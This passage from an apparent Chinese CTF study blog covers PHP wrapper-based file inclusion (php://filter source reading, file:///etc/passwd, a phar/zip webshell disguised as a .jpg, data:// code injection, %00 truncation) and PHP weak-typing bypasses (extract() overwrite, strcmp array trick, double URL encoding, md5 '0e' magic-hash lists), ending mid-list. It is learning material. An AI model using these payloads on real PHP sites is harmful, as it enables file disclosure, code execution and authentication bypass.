src="https://img-blog.csdnimg.cn/20200520133332295.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>然后看到了ctf_go_go_go文件，然后使用命令cat 来查看文件内容。<br><img src="https://img-blog.csdnimg.cn/20200520135439422.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>flag查到。</p><h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h3><p>主要用于读取源代码并进行base64编码输出。<br>使用方法payload</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://<span class="keyword">filter</span>/read=convert.base64<span class="literal">-encode</span>/resource=upload.php</span><br></pre></td></tr></table></figure><h2 id="file-协议"><a href="#file-协议" class="headerlink" title="file://协议"></a>file://协议</h2><p>file://协议在双off的情况下也是可以正常使用的。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen ：off/on</span><br><span class="line"></span><br><span class="line">allow_url_include：off/on</span><br></pre></td></tr></table></figure><p>file://用于访问本地文件系统，在CTF中常用来读取本地文件。</p><p>使用方法：file://文件的绝对路径和文件名。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:<span class="comment">///etc/passwd</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200520141256329.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"></p><h2 id="phar-协议"><a href="#phar-协议" class="headerlink" title="phar://协议"></a>phar://协议</h2><p>phar://：PHP 归档，常常跟文件包含，文件上传结合着考察。当文件上传仅仅校验mime类型与文件后缀</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx.php(木马)-&gt;压缩-&gt;xxx.zip-&gt;改后缀-&gt;xxx.jpg-&gt;上传-&gt;phar:<span class="comment">//xx.jpg/xxx.php</span></span><br></pre></td></tr></table></figure><p>与文件上传相结合。</p><h2 id="zip-协议"><a href="#zip-协议" class="headerlink" title="zip://协议"></a>zip://协议</h2><p>在<code>allow_url_fopen</code>，<code>allow_url_include</code>都关闭的情况下可以正常使用，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file.php?file=zip://[压缩文件绝对路径]<span class="comment">#[压缩文件内的子文件名]</span></span><br><span class="line">file.php?file=zip://nac.jpg<span class="comment">#nac.php  其中get请求中#需要进行编码，即%23</span></span><br></pre></td></tr></table></figure><h2 id="data-协议"><a href="#data-协议" class="headerlink" title="data://协议"></a>data://协议</h2><p>data://：需满足<code>allow_url_fopen</code>，<code>allow_url_include</code>同时开启才能使用，使用如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">file.php?file=data://text/plain,&lt;?php phpinfo()?&gt;</span><br><span class="line">file.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span><br><span class="line">file.php?file=data:text/plain,&lt;?php phpinfo()?&gt;</span><br><span class="line">file.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span><br></pre></td></tr></table></figure><p>还是那个例题：<br><img src="https://img-blog.csdnimg.cn/20200520141105196.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"></p><h1 id="截断问题"><a href="#截断问题" class="headerlink" title="截断问题"></a>截断问题</h1><p>是否截断要考虑php的版本问题，PHP版本为&gt;=5.2 具体为5.2，5.3，5.5，7.0；不能使用%00截断。<br>PHP版本&lt;=5.2 可以使用%00进行截断。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">情况一：不需要截断：</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/test.php?file=file:///c:/users/Thinking/desktop/flag.txt</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="meta">include($</span><span class="bash">_GET[<span class="string">&#x27;file&#x27;</span>])</span></span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">情况二：需要截断：</span><br><span class="line"></span><br><span class="line">在php版本&lt;=5.2中进行测试是可以使用%00截断的。</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/test.php?file=file:///c:/users/Thinking/desktop/flag.txt%00</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="meta">include($</span><span class="bash">_GET[<span class="string">&#x27;file&#x27;</span>].’.php’)</span></span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>文末寄语：</p><blockquote><p>我觉得生命是最重要的，所以在我心里，没有事情是解决不了的。不是每一个人都可以幸运地过自己理想中的生活，有楼有车当然好了，没有难道哭吗？所以呢，我们一定要享受我们所过的生活。        —— 《新不了情》</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> PHP伪协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP代码审计————弱类型</title>
      <link href="/2020/08/23/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94%E5%BC%B1%E7%B1%BB%E5%9E%8B/"/>
      <url>/2020/08/23/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94%E5%BC%B1%E7%B1%BB%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>现在开始接触代码审计类型的题了，学长给我们讲过了bugku的一些题，然后我看了一些其他的社区的文章和博客，学习了简单的php代码审计，并在学习过后做几道相关的题来熟悉套路。</p><h1 id="extract变量覆盖"><a href="#extract变量覆盖" class="headerlink" title="extract变量覆盖"></a>extract变量覆盖</h1><h2 id="知识了解"><a href="#知识了解" class="headerlink" title="知识了解"></a>知识了解</h2><p>首先关于变量覆盖有这么一段简单代码可以说明（简单明了）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="string">&#x27;lalala&#x27;</span>;</span><br><span class="line">$lalala=<span class="string">&#x27;xixixi&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> $$a;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出结果是<code>xixixi</code><br>再看看一个有漏洞的代码，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);<span class="comment">//让浏览器能读懂</span></span><br><span class="line">$a=<span class="string">&#x27;aa&#x27;</span>;</span><br><span class="line">$aa=<span class="string">&#x27;123&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;第一次变量aa的值是&#x27;</span>.$aa.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">$$a=$_GET[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;第二次变量aa的值是&#x27;</span>.$aa.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>结果：<br><img src="https://img-blog.csdnimg.cn/2020042110023254.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br><code>extract()</code>函数的作用：<br><img src="https://img-blog.csdnimg.cn/20200421101503634.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="来自w3school" loading="lazy"><br>至于extract()变量覆盖就是两者综合。</p><h2 id="例题实战"><a href="#例题实战" class="headerlink" title="例题实战"></a>例题实战</h2><p><img src="https://img-blog.csdnimg.cn/2020042110193812.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="来自bugku" loading="lazy"><br>php代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag=<span class="string">&#x27;xxx&#x27;</span>;</span><br><span class="line">extract($_GET);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($shiyan))&#123;</span><br><span class="line">$content=trim(file_get_contents($flag));</span><br><span class="line"><span class="keyword">if</span>($shiyan==$content)&#123;</span><br><span class="line"><span class="keyword">echo</span><span class="string">&#x27;flag&#123;xxx&#125;&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span><span class="string">&#x27;Oh.no&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>学习过程中参考其他师傅的博客，然后发现有师傅尝试构造了<code>?shiyan=1&amp;flag=1</code>，看起来是没错，但是flag没有显示出来。原因是变量覆盖的定义弄混淆了，覆盖的话，会覆盖<strong>数组中的同名元素会覆盖</strong>，那flag里，不只有数字吧，所以这样构造不行，也不能构造字母，那样也显示不出来，所以直接构造空，不用管flag里面是什么类型。<br><img src="https://img-blog.csdnimg.cn/20200421104922776.png" alt="Augenstern" loading="lazy"><br>看出flag是有字母，有数字，还有杠。<br>还有一个大佬写的博客呢是这样的，先看题目代码。<br><img src="https://img-blog.csdnimg.cn/20200421105047738.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>这道题的话，那位师傅直接构造<code>?gift=a&amp;flag=a</code>可以直接显示出来，为什么呢，就是因为这道题的flag全是字母。<br>因为我不知道这道题，所以就拿那个师傅的图记录一下，下面有这个师傅的博客的链接。<br><img src="https://img-blog.csdnimg.cn/20200421105610834.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>因为flag里都是字母，所以可以那样构造。这里放上那个师傅的博客<a href="https://blog.51cto.com/12332766/2120865">51cto师傅博客</a></p><h1 id="strcmp比较字符串"><a href="#strcmp比较字符串" class="headerlink" title="strcmp比较字符串"></a>strcmp比较字符串</h1><h2 id="知识了解-1"><a href="#知识了解-1" class="headerlink" title="知识了解"></a>知识了解</h2><p>strcmp(string $str1,string $str2);<br>如果str1&gt;str2返回&gt;0，如果str1&lt;str2,返回&lt;0，如果str1=str2，返回0。<br><img src="https://img-blog.csdnimg.cn/20200421111427534.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="来自w3school" loading="lazy"></p><h2 id="例题实战-1"><a href="#例题实战-1" class="headerlink" title="例题实战"></a>例题实战</h2><p><img src="https://img-blog.csdnimg.cn/20200421113859755.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="来自bugku" loading="lazy"><br>比较两个字符串大小，可以传入非字符串，直接传一个数组就行了。<br><code>strcmp()</code>漏洞理解：<br>strcmp()要求传入字符串，如果传入的不是字符串，那么函数就会报错，返回return 0；这里虽然报错了，但是却让其函数值相等了。让flag显示出来了。<br><img src="https://img-blog.csdnimg.cn/20200421114336649.png" alt="Augenstern" loading="lazy"></p><h1 id="urldecode二次编码绕过"><a href="#urldecode二次编码绕过" class="headerlink" title="urldecode二次编码绕过"></a>urldecode二次编码绕过</h1><h2 id="知识了解-2"><a href="#知识了解-2" class="headerlink" title="知识了解"></a>知识了解</h2><p><code>urldecode()</code>函数是对一个字符串(一般是URL字符串)进行解码。<br><img src="https://img-blog.csdnimg.cn/20200421123558244.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"></p><h2 id="例题实战-2"><a href="#例题实战-2" class="headerlink" title="例题实战"></a>例题实战</h2><p><img src="https://img-blog.csdnimg.cn/20200421124401977.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="来自bugku" loading="lazy"><br>代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(eregi(<span class="string">&quot;hackerDJ&quot;</span>,$_GET[id])) &#123;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;not allowed!&quot;</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">$_GET[id] = urldecode($_GET[id]);</span><br><span class="line"><span class="keyword">if</span>($_GET[id] == <span class="string">&quot;hackerDJ&quot;</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Access granted!&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>使用<code>$_GET</code>时，浏览器就已经把<code>hakerDJ</code>进行了一次解码了，然后又用了urldecode函数又再次进行了一次解码。<br>再看代码逻辑是如果id=hackerDJ会返回not allowed。但是，要想得到flag，还是要让id=hackerDJ。绕过要进行二次编码。<br>字符串中随便一个字母，我选的是第一个h<br>所以找到它的URL编码格式<br><img src="https://img-blog.csdnimg.cn/20200421130953694.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>然后再次对<code>%68</code>进行编码<br>是<code>%2568</code>，然后构造</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=%<span class="number">2568</span>ackerDJ</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200421131309820.png" alt="Augenstern" loading="lazy"></p><h1 id="md5-函数"><a href="#md5-函数" class="headerlink" title="md5()函数"></a>md5()函数</h1><h2 id="知识了解-3"><a href="#知识了解-3" class="headerlink" title="知识了解"></a>知识了解</h2><p><img src="https://img-blog.csdnimg.cn/20200421132115166.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="来自w3school" loading="lazy"><br>php中MD5函数漏洞：<br>第一种：数组绕过</p><blockquote><p>在PHP中，MD5是不能处理数组的，md5(数组)会返回null</p></blockquote><p>第二种：</p><blockquote><p>PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。</p></blockquote><p>常见的被MD5认成是0的几个字符串<br>纯数字类</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">240610708 0e462097431906509019562988736854</span><br><span class="line">314282422 0e990995504821699494520356953734</span><br><span class="line">571579406 0e972379832854295224118025748221</span><br><span class="line">903251147 0e174510503823932942361353209384</span><br><span class="line">1110242161 0e435874558488625891324861198103</span><br><span class="line">1320830526 0e912095958985483346995414060832</span><br><span class="line">1586264293 0e622743671155995737639662718498</span><br><span class="line">2302756269 0e250566888497473798724426794462</span><br><span class="line">2427435592 0e067696952328669732475498472343</span><br><span class="line">2653531602 0e877487522341544758028810610885</span><br><span class="line">3293867441 0e471001201303602543921144570260</span><br><span class="line">3295421201 0e703870333002232681239618856220</span><br><span class="line">3465814713 0e258631645650999664521705537122</span><br><span class="line">3524854780 0e507419062489887827087815735195</span><br><span class="line">3908336290 0e807624498959190415881248245271</span><br><span class="line">4011627063 0e485805687034439905938362701775</span><br><span class="line">4775635065 0e998212089946640967599450361168</span><br><span class="line">4790555361 0e643442214660994430134492464512</span><br><span class="line">5432453531 0e512318699085881630861890526097</span><br><span class="line">5579679820 0e877622011730221803461740184915</span><br><span class="line">5585393579 0e664357355382305805992765337023</span><br><span class="line">6376552501 0e165886706997482187870215578015</span><br><span class="line">7124129977 0e500007361044747804682122060876</span><br><span class="line">7197546197 0e915188576072469101457315675502</span><br><span class="line">7656486157 0e451569119711843337267091732412</span><br></pre></td></tr></table></figure><p>大写字母类：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">QLTHNDT 0e405967825401955372549139051580</span><br><span class="line">QNKCDZO 0e830400451993494058024219903391</span><br><span class="line">EEIZDOI 0e782601363539291779881938479162</span><br><span class="line">TUFEPMC 0e839407194569345277863905212547</span><br><span class="line">UTIPEZQ 0e382098788231234954670291303879</span><br><span class="line">UYXFLOI 0e552539585246568817348686838809</span><br><span class="line">IHKFRNS 0e256160682445802696926137988570</span><br><span class="line">PJNPDWY 0e291529052894702774557631701704</span><br><span class="line">ABJIHVY 0e755264355178451322893275696586</span><br><span class="line">DQWRASX 0e742373665639232907775599582643</span><br><span class="line">DYAXWCA 0e424759758842488633464374063001</span><br><span class="line">GEGHBXL 0e248776895502908863709684713578</span><br><span class="line">GGHMVOE 0e362766013028313274586933780773</span><br><span class="line">GZECLQZ 0e537612333747236407713628225676</span><br><span class="line">NWWKITQ 0e763082070976038347657360817689</span><br><span class="line">NOOPCJF 0e818888003657176127862245791911</span><br><span class="line">MAUXXQC 0e478478466848439040434801845361</span><br><span class="line">MMHUWUV 0e701732711630150438129209816536</span><br></pre></td></tr></table></figure><p>第三种：“0E”绕过<br>一些哈希后0E开头的字符</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1184209335a</span><br><span class="line">0e072485820392773389523109082030</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s532378020a</span><br><span class="line">0e220463095855511507588041205815</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">240610708 </span><br><span class="line">0e462097431906509019562988736854</span><br><span class="line">314282422 </span><br><span class="line">0e990995504821699494520356953734</span><br><span class="line">571579406 </span><br><span class="line">0e972379832854295224118025748221</span><br><span class="line">903251147 </span><br><span class="line">0e174510503823932942361353209384</span><br><span class="line">1110242161 </span><br><span class="line">0e435874558488625891324861198103</span><br><span class="line">1320830526 </span><br><span class="line">0e912095958985483346995414060832</span><br><span class="line">1586264293 </span><br><span class="line">0e622743671155995737639662718498</span><br><span class="line">2302756269 </span><br><span class="line">0e250566888497473798724426794462</span><br><span class="line">2427435592 </span><br><span class="line">0e067696952328669732475498472343</span><br><span class="line">2653531602 </span><br><span class="line">0e877487522341544758028810610885</span><br><span class="line">3293867441 </span><br><span class="line">0e471001201303602543921144570260</span><br><span class="line">3295421201 </span><br><span class="line">0e703870333002232681239618856220</span><br><span class="line">3465814713 </span><br><span class="line">0e258631645650999664521705537122</span><br><span class="line">3524854780 </span><br><span class="line">0e507419062489887827087815735195</span><br><span class="line">3908336290 </span><br><span class="line">0e807624498959190415881248245271</span><br><span class="line">4011627063 </span><br><span class="line">0e485805687034439905938362701775</span><br><span class="line">4775635065 </span><br><span class="line">0e998212089946640967599450361168</span><br><span class="line">4790555361 </span><br><span class="line">0e643442214660994430134492464512</span><br><span class="line">5432453531 </span><br><span class="line">0e512318699085881630861890526097</span><br><span class="line">5579679820 </span><br><span class="line">0e877622011730221803461740184915</span><br><span class="line">5585393579 </span><br><span class="line">0e664357355382305805992765337023</span><br><span class="line">6376552501 </span><br><span class="line">0e165886706997482187870215578015</span><br><span class="line">7124129977 </span><br><span 